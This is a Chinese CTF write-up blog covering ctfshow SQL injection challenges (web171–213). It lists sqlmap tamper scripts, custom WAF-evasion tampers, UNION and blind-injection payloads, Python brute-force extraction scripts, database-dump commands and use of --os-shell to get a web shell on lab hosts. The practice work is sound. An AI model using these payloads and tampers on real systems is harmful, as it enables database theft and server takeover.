当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论space2morehash.py MySQL中空格替换为 #号 以及更多随机字符串 换行符appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤space2mssqlblank.py mssql空格替换为其它空符号base64encode.py 用base64编码space2mssqlhash.py mssql查询中替换空格modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释space2mysqlblank.py mysql中空格替换其它空白符号between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）multiplespaces.py 围绕SQL关键字添加多个空格space2plus.py 用+替换空格bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换&#x3D;为likenonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示 suitable for替代space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾chardoubleencode.py 双url编码(不处理以编码的)unionalltounion.py 替换UNION ALL SELECT UNION SELECTcharencode.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；randomcase.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写unmagicquotes.py 宽字符绕过 GPC addslashesrandomcomments.py 用&#x2F;**&#x2F;分割sql关键字charunicodeencode.py ASP，ASP.NET中字符串 unicode 编码securesphere.py 追加特制的字符串versionedmorekeywords.py MySQL &gt;&#x3D; 5.1.13注释绕过halfversionedmorekeywords.py MySQL &lt; 5.1中关键字前加注释space2comment.py替换空格字符串(‘‘) 使用注释‘&#x2F;**&#x2F;’</code></pre><p>比如说这里过滤了空格，就可以使用space2comment.py文件<br>payload：</p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;1418c415-d521-4839-b163-39778bb6d088.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;1418c415-d521-4839-b163-39778bb6d088.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment --batch -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump</code></pre><h2 id="如何写自己的tamper脚本"><a href="#如何写自己的tamper脚本" class="headerlink" title="如何写自己的tamper脚本"></a>如何写自己的tamper脚本</h2><p><a href="https://www.wlhhlc.top/posts/14827">https://www.wlhhlc.top/posts/14827</a> 参考这个佬学会的<br>我们打开space2comment.py 修改（文件在<code>/usr/share/sqlmap/tamper</code>下）<br>我们编辑脚本，并将其中的<code>/**/</code>修改为 <code>%09</code>来做到绕过空格。<br>新建一个space2comment2.py 然后将修改后的脚本粘贴进去：</p><pre class="language-bash" data-language="bash"><code class="language-bash">#!&#x2F;usr&#x2F;bin&#x2F;env pythonfrom lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ &#x3D; PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):    retVal &#x3D; payload    if payload:        retVal &#x3D; &quot;&quot;        quote, doublequote, firstspace &#x3D; False, False, False        for i in xrange(len(payload)):            if not firstspace:                if payload[i].isspace():                    firstspace &#x3D; True                    retVal +&#x3D; chr(0x9)                    continue            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:                quote &#x3D; not quote            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:                doublequote &#x3D; not doublequote            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:                retVal +&#x3D; chr(0x9)                continue            retVal +&#x3D; payload[i]    return retVal</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689171350412-cce3a4a4-a1d3-4275-9381-4b8988fe4572.png" alt="image.png"><br>然后就可以运行自己的tamper了。</p><h1 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h1><pre class="language-bash" data-language="bash"><code class="language-bash">&#x2F;&#x2F;对传入的参数进行了过滤&#x2F;&#x2F; $id &#x3D; str_replace(&#39;select&#39;, &#39;&#39;, $id);  function waf($str)&#123;   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);  &#125;</code></pre><p>过滤了select，但是是小写，sqlmap是可以用大写的绕过的。因此还用上题目的脚本即可：</p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment2 --batch -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump</code></pre><p>注意我这里使用的上道题编写的<code>space2comment**2**</code>而不是<code>space2comment</code>当然用后者也可以。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>有时候可以直接无差别爆破，比如知道库就直接跳到dump，sqlmap会自己挖出所有的串</p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment2 --batch -D ctfshow_web --dump</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689171787437-65fd338d-a17a-4aa1-b36f-d7a463cb3675.png" alt="image.png"></p><h1 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h1><h3 id="自定义tamper"><a href="#自定义tamper" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><pre class="language-bash" data-language="bash"><code class="language-bash">function waf($str)&#123; &#x2F;&#x2F;TODO 未完工 return preg_match(&#39;&#x2F; |\*|\&#x3D;&#x2F;&#39;, $str);&#125;</code></pre><p>过滤空格 * &#x3D;<br>等号可以用<code>like</code>代替<br>简便一下脚本如图：</p><pre class="language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env pythonfrom lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ &#x3D; PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):    retVal &#x3D; payload    retVal &#x3D; retVal.replace(&quot;&#x3D;&quot;, &quot; like &quot;)    retVal &#x3D; retVal.replace(&quot; &quot;, chr(0x09))    return retVal</code></pre><p>我保存在了tamper目录下的ctfshow209.py文件<br>payload运行即可：</p><pre class="language-python" data-language="python"><code class="language-python">sqlmap -u http:&#x2F;&#x2F;cbbe7a5a-da99-494c-b921-3167867de00b.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;cbbe7a5a-da99-494c-b921-3167867de00b.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;ctfshow209 --batch -D ctfshow_web --dump</code></pre><h2 id="By-the-way"><a href="#By-the-way" class="headerlink" title="By the way"></a>By the way</h2><p>做了这么多，payload其实不太好换，来个正则直接在emeditor里面直接替换了。<br>正则如下：</p><pre class="language-python" data-language="python"><code class="language-python">http:&#x2F;&#x2F;[a-zA-Z0-9\-\.]+&#x2F;</code></pre><p>正则有机会一定要学一下。</p><h1 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h1><h3 id="自定义tamper-1"><a href="#自定义tamper-1" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><pre class="language-python" data-language="python"><code class="language-python">function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;</code></pre><p>它的作用是对一个经过两次base64编码的字符串进行解码和反转操作。<br>具体分析如下：</p><ol><li>base64_decode($id)：此部分代码表示对一个变量 $id 进行base64解码操作。在Python中，可以使用 base64.b64decode() 函数来实现。</li><li>strrev(base64_decode($id))：此部分代码表示对上一步中解码后的结果进行字符串反转操作。在Python中，可以使用字符串切片来实现，即将字符串反向取值，例如 string[::-1]。</li><li>base64_decode(strrev(base64_decode($id)))：此部分代码表示对前一步的反转结果再次进行base64解码。</li><li>strrev(base64_decode(strrev(base64_decode($id))))：最后一步将前一步解码后的结果再次进行字符串反转操作，得到最终的解码结果。</li></ol><p>把解密过程反过来即可。<br>我们可以有两种解法第一种wp中写法：</p><pre class="language-python" data-language="python"><code class="language-python">from base64 import *retVal &#x3D; retVal.replace(&quot;-- -&quot;, &quot;#&quot;)retVal &#x3D; b64encode(&quot;&quot;.join(reversed(b64encode(&quot;&quot;.join(reversed(retVal)).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;))).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)print(retVal)</code></pre><p>第二种就是：</p><pre class="language-python" data-language="python"><code class="language-python">import base64reversed_string1 &#x3D; retVal[::-1]encoded_string1 &#x3D; base64.b64encode(reversed_string1.encode()).decode()reversed_string2 &#x3D; encoded_string1[::-1]encrypted_string &#x3D; base64.b64encode(reversed_string2.encode()).decode()print(encrypted_string)</code></pre><p>其中第二种<code>[::-1]</code>是Python中字符串切片（slice）的一种用法，它表示将字符串反向取值。<br>脚本以第一种为例：</p><pre class="language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python&quot;&quot;&quot;Copyright (c) 2006-2022 sqlmap developers (https:&#x2F;&#x2F;sqlmap.org&#x2F;)See the file &#39;LICENSE&#39; for copying permission&quot;&quot;&quot;from lib.core.compat import xrangefrom lib.core.enums import PRIORITYfrom base64 import *__priority__ &#x3D; PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):    retVal &#x3D; payload    retVal &#x3D; retVal.replace(&quot;-- -&quot;, &quot;#&quot;)    retVal &#x3D; b64encode(&quot;&quot;.join(reversed(b64encode(&quot;&quot;.join(reversed(retVal)).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;))).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)    return retVal</code></pre><p>payload：</p><pre class="language-python" data-language="python"><code class="language-python">sqlmap -u http:&#x2F;&#x2F;63c468c1-0392-4832-87ce-7fe0b3345449.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;63c468c1-0392-4832-87ce-7fe0b3345449.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;ctfshow210 --batch -D ctfshow_web --dump</code></pre><h2 id="python中的-1"><a href="#python中的-1" class="headerlink" title="python中的[::-1]"></a>python中的[::-1]</h2><p>在Python中，[start:stop:step] 是用来截取或提取字符串（或列表等可迭代对象）的一种方法。当省略 start 和 stop 参数时，它会默认使用整个字符串。而 step 参数表示步长，控制取值的方向和间隔。<br>当 step 参数为负数时，即 [::-1]，它表示从字符串的末尾开始，以倒序的方式取值，步长为1。换句话说，它实现了将字符串反转的效果。<br>下面是一个例子来说明该用法：</p><pre class="language-none"><code class="language-none">python复制代码string &#x3D; &quot;Hello, World!&quot;reversed_string &#x3D; string[::-1]print(reversed_string)</code></pre><p>输出结果为：</p><pre class="language-none"><code class="language-none">复制代码!dlroW ,olleH</code></pre><h1 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h1><h3 id="自定义tamper-2"><a href="#自定义tamper-2" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><p>加了一个空格过滤，修改一下脚本即可。<br>在脚本操作中加一行：</p><pre class="language-python" data-language="python"><code class="language-python">retVal &#x3D; retVal.replace(&quot; &quot;, chr(0x0a))</code></pre><p>即可。<br>payload不变：</p><pre class="language-python" data-language="python"><code class="language-python">sqlmap -u http:&#x2F;&#x2F;0e8324af-9ca2-4ec5-b9ce-0d6856a8528a.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;0e8324af-9ca2-4ec5-b9ce-0d6856a8528a.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;ctfshow210 --batch -D ctfshow_web --dump</code></pre><h1 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h1><h3 id="自定义tamper-3"><a href="#自定义tamper-3" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><pre class="language-python" data-language="python"><code class="language-python">&#x2F;&#x2F;对查询字符进行解密  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;function waf($str)&#123;    return preg_match(&#39;&#x2F; |\*&#x2F;&#39;, $str);&#125;</code></pre><p>加了个星号，无关痛痒，还用上一题的即可。<br>payload：</p><pre class="language-python" data-language="python"><code class="language-python">sqlmap -u http:&#x2F;&#x2F;29fa0dfe-7f52-4f70-83e9-2795e92dcb6b.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;29fa0dfe-7f52-4f70-83e9-2795e92dcb6b.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;ctfshow210 --batch -D ctfshow_web --dump</code></pre><h1 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h1><h3 id="–os-shell-一键getshell"><a href="#–os-shell-一键getshell" class="headerlink" title="–os-shell 一键getshell"></a>–os-shell 一键getshell</h3><pre class="language-python" data-language="python"><code class="language-python">sqlmap -u http:&#x2F;&#x2F;97a2ce63-a000-4020-838b-9eccc076d657.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;97a2ce63-a000-4020-838b-9eccc076d657.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1  --tamper&#x3D;ctfshow210.py --os-shell</code></pre><h2 id="什么是–os-shell"><a href="#什么是–os-shell" class="headerlink" title="什么是–os-shell"></a>什么是–os-shell</h2><p>–os-shell 其本质是写入两个shell文件，其中一个可以命令执行，另一个则是可以让我们上传文件；<br>不过也是有限制的，上传文件我们需要受到两个条件的限制，一个是网站的绝对路径，另一个则是导入导出的权限</p><p>在mysql中，由 secure_file_priv 参数来控制导入导出权限，该参数后面为null时，则表示不允许导入导出；如果是一个文件夹，则表示仅能在这个文件夹中导入导出；如果参数后面为空，也就是没有值时，则表示在任何文件夹都能导入导出<br>payload：</p><pre class="language-python" data-language="python"><code class="language-python">sqlmap -u http:&#x2F;&#x2F;899832c9-8556-49fb-8f82-2b4156bed9bf.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;899832c9-8556-49fb-8f82-2b4156bed9bf.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1  --tamper&#x3D;ctfshow210 --batch --level&#x3D;5 --os-shell</code></pre><p>然后就会出现shell页面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689175482915-61978078-d777-4dbe-820b-ad1b742325f8.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689175522091-1b21cb86-9dfb-4896-8dca-fdd1bf8d1d85.png" alt="image.png"><br>执行完输入q退出即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web171-web190SQL注入篇</title>
      <link href="/posts/65bd4621/"/>
      <url>/posts/65bd4621/</url>
      
        <content type="html"><![CDATA[<p>web171</p><pre class="language-json" data-language="json"><code class="language-json">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre><p>三栏一眼丁真，直接内容拼入即可。</p><pre class="language-json" data-language="json"><code class="language-json">-1&#39; union select 1,2,database() --+</code></pre><p>查询库名：</p><pre class="language-json" data-language="json"><code class="language-json">-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p><code>information_schema,test,mysql,performance_schema,ctfshow_web</code><br>查询表名：</p><pre class="language-json" data-language="json"><code class="language-json">-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</code></pre><p><code>ctfshow_user</code><br>查询字段</p><pre class="language-json" data-language="json"><code class="language-json">-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_user&#39; --+</code></pre><p><code>id,username,password</code><br>三栏直接输出三种：</p><pre class="language-json" data-language="json"><code class="language-json">-1&#39; union select id,username,password from ctfshow_web.ctfshow_user --+</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688962855743-a9561019-8b4a-4ad8-a1b9-9829a17ae716.png" alt="image.png"><br>当然 sqlmap也是可以的。直接开注入</p><h1 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h1><pre class="language-json" data-language="json"><code class="language-json">$sql &#x3D; &quot;select username,password from ctfshow_user2 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre><p>现实位置变为了两个。<br>通过上题的数据库结构可以直接出payload</p><pre class="language-json" data-language="json"><code class="language-json">-1&#39; union select 1,password from ctfshow_web.ctfshow_user2  --+</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688978037707-0ffcb803-78fd-4c25-93a9-2c20d87eaa92.png" alt="image.png"></p><h1 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h1><pre class="language-json" data-language="json"><code class="language-json">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,password from ctfshow_user3 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre><p>一样payload</p><pre class="language-json" data-language="json"><code class="language-json">-1&#39; union select 1,2,password from ctfshow_web.ctfshow_user3 --+</code></pre><h1 id="web174、web175"><a href="#web174、web175" class="headerlink" title="web174、web175"></a>web174、web175</h1><p>说是考的基础，那么就一步一步来。</p><pre class="language-json" data-language="json"><code class="language-json">&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,password from ctfshow_user2 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;&#x2F;&#x2F;检查结果是否有flag    if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;    &#125;</code></pre><p>有返回过滤了。<br>174、175怎么输入什么都提示错误。</p><h1 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h1><h3 id="大小写绕过过滤"><a href="#大小写绕过过滤" class="headerlink" title="大小写绕过过滤"></a>大小写绕过过滤</h3><p>简单过滤，大小写就能绕过过滤。</p><pre class="language-json" data-language="json"><code class="language-json">-1&#39; uNion SeLeCt 1,2,password from ctfshow_user --+</code></pre><h1 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h1><h3 id="、-09、-0a-d绕过空格过滤"><a href="#、-09、-0a-d绕过空格过滤" class="headerlink" title="&#x2F;**&#x2F;、%09、%0a-%d绕过空格过滤"></a>&#x2F;**&#x2F;、%09、%0a-%d绕过空格过滤</h3><blockquote><p><a href="https://blog.csdn.net/acsuccess/article/details/69360931">https://blog.csdn.net/acsuccess/article/details/69360931</a> 绕过空格过滤</p></blockquote><p>过滤了空格，把空格更换一下即可<br>以下是几种常见绕过过滤的方法。</p><ul><li>注释绕过 <code>/**/</code></li><li>括号绕过 <code>select(user())from dual where(1=1)and(2=2)</code></li></ul><p>除此之外要注意一下，上面几道题的payload中的+会被转义为空格，因此如果使用+就会出现无法查询的情况。<br>那么就要使用url转义来绕过空格。<br>比如：</p><ul><li>Tab &gt; %09</li><li>换页符 &gt; %0c</li></ul><p>这两个都是可以的。<br>于是就可以得到payload：</p><pre class="language-json" data-language="json"><code class="language-json">?id&#x3D;0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;id,username,password&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user&#x2F;**&#x2F;--%09</code></pre><h1 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h1><h3 id="、-09、-0a-d绕过空格过滤-1"><a href="#、-09、-0a-d绕过空格过滤-1" class="headerlink" title="&#x2F;**&#x2F;、%09、%0a-%d绕过空格过滤"></a>&#x2F;**&#x2F;、%09、%0a-%d绕过空格过滤</h3><p>把<code>/**/</code>过滤掉了那就只能使用上面两个转义符绕过了。<br>那就用%09</p><pre class="language-json" data-language="json"><code class="language-json">-1&#39;%09union%09select%091,2,password%09from%09ctfshow_user%09--%09</code></pre><p>注意，经过测试，<code>%09</code>可以替换为<code>%0a-%0d</code>均可以</p><h1 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h1><h3 id="、-09、-0a-d绕过空格过滤-2"><a href="#、-09、-0a-d绕过空格过滤-2" class="headerlink" title="&#x2F;**&#x2F;、%09、%0a-%d绕过空格过滤"></a>&#x2F;**&#x2F;、%09、%0a-%d绕过空格过滤</h3><p><code>/**/</code>等都被过滤了，可以使用%0c和%0d绕过过滤。</p><pre class="language-json" data-language="json"><code class="language-json">-1&#39;%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0c--%0c</code></pre><h1 id="web180-web182"><a href="#web180-web182" class="headerlink" title="web180-web182"></a>web180-web182</h1><p>过滤了所有的空白符号。<br>这里网上给的办法是直接去根据id直接查，其实也可以。</p><pre class="language-json" data-language="json"><code class="language-json">-1&#39;||id&#x3D;26||&#39;或者-1&#39;or(id&#x3D;26)and&#39;&#39;&#x3D;&#39;</code></pre><p>可以使用第二种这种将末尾的单引号闭合就可以不用注释符号了</p><h1 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h1><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><pre class="language-json" data-language="json"><code class="language-json">function waf($str)&#123;    return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into&#x2F;i&#39;, $str);  &#125;</code></pre><p>有两种payload。</p><pre class="language-json" data-language="json"><code class="language-json">[POST]PAYLOAD:tableName&#x3D;&#96;ctfshow_user&#96;where((substr(&#96;pass&#96;,1,8)regexp(&quot;ctfshow&#123;&quot;)))[POST]PAYLOAD:tableName&#x3D;(ctfshow_user)where(pass)like&#39;ctfshow&#123;%25&#39;</code></pre><p>这里分别解释一下两个语句：</p><h2 id="regexp和like关键字-和-标识符"><a href="#regexp和like关键字-和-标识符" class="headerlink" title="regexp和like关键字 %和_标识符"></a>regexp和like关键字 %和_标识符</h2><p>第一个payload：<br>REGEXP 是 SQL 中的一个模式匹配操作符，它用于在字符串中查找与给定的正则表达式匹配的子串。<br>第二个paylaod：<br>LIKE操作符使用字符串匹配模式来比较列的值，常见的模式匹配特殊字符是 % (百分号) 和 _ (下划线)。<br>‘aa%’：这是一个用于匹配的模式。在这个例子中，’aa%’表示以”aa”开头的任意字符或字符串。%是LIKE操作符的通配符，代表任意数量的字符（包括零个字符）。<br>也就是匹配<code>aabbs</code><br>当我们使用 LIKE 操作符和下划线 _ 结合时，它表示匹配单个字符的任意位置，类似于通配符?<br>也就是匹配<code>aab</code><br>这里使用py写脚本。<br>第一种：</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL盲注.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;10 17:49   natro92      1.0         None&quot;&quot;&quot;import requestsimport stringurl &#x3D; r&#39;http:&#x2F;&#x2F;0d89238a-2c87-4371-b427-2670ebb10351.challenge.ctf.show&#x2F;select-waf.php&#39;str &#x3D; r&#39;0123456789-abcdefghijklmnopqrstuvwxyz&#125;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;payload &#x3D; &quot;(ctfshow_user)where(pass)regexp&#39;&#123;&#125;&#39;&quot;i &#x3D; 0key &#x3D; 0while(1):    if key &#x3D;&#x3D; 1:        break    print(i)    i &#x3D; i + 1    for j in str:        data &#x3D; &#123;            &#39;tableName&#39;: payload.format(flag_pre + j)        &#125;        r &#x3D; requests.post(url, data&#x3D;data)        if &#39;$user_count &#x3D; 1&#39; in r.text:            flag_pre +&#x3D; j            print(flag_pre)            if j &#x3D;&#x3D; &#39;&#125;&#39;:                key &#x3D; 1</code></pre><p>第二种：</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL盲注.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;10 17:49   natro92      1.0         None&quot;&quot;&quot;import requestsimport stringurl &#x3D; r&#39;http:&#x2F;&#x2F;0d89238a-2c87-4371-b427-2670ebb10351.challenge.ctf.show&#x2F;select-waf.php&#39;str &#x3D; r&#39;0123456789-abcdefghijklmnopqrstuvwxyz&#125;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;payload &#x3D; &#39;(ctfshow_user)where(pass)like&quot;&#123;&#125;%&quot;&#39;i &#x3D; 0key &#x3D; 0while(1):    if key &#x3D;&#x3D; 1:        break    print(i)    i &#x3D; i + 1    for j in str:        data &#x3D; &#123;            &#39;tableName&#39;: payload.format(flag_pre + j)        &#125;        r &#x3D; requests.post(url, data&#x3D;data)        if &#39;count &#x3D; 1&#39; in r.text:            flag_pre +&#x3D; j            print(flag_pre)            if j &#x3D;&#x3D; &#39;&#125;&#39;:                key &#x3D; 1</code></pre><h1 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h1><h3 id="右连接"><a href="#右连接" class="headerlink" title="右连接"></a>右连接</h3><pre class="language-python" data-language="python"><code class="language-python">&#x2F;&#x2F;对传入的参数进行了过滤  function waf($str)&#123;    return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);  &#125;</code></pre><h2 id="什么是右连接"><a href="#什么是右连接" class="headerlink" title="什么是右连接"></a>什么是右连接</h2><p>SQL 中的右连接（Right Join）用于将两个表按照指定的列进行连接，并返回右侧表中所有行及其与左侧表中匹配行的列值，如果左侧表中没有匹配的行，则返回 NULL 值。<br>比如：</p><pre class="language-python" data-language="python"><code class="language-python">SELECT columnsFROM table1RIGHT JOIN table2ON table1.column &#x3D; table2.column;</code></pre><p>比如：</p><pre class="language-python" data-language="python"><code class="language-python">SELECT students.name, scores.scoreFROM studentsRIGHT JOIN scoresON students.id &#x3D; scores.student_id;</code></pre><p>在这个例子中，我们使用 RIGHT JOIN 将 scores 表右连接到 students 表上，按照 students.id 和 scores.student_id 进行连接，查询学生姓名和对应的成绩。如果 scores 表中没有匹配的行，则返回 NULL 值。<br>因此这道题里面就可以使用如下payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">tableName&#x3D;ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686f7725</code></pre><p><code>0x63746673686f7725</code>是ctfshow%的十六进制编码<br>python中可以使用以下代码实现转换为十六进制：</p><pre class="language-python" 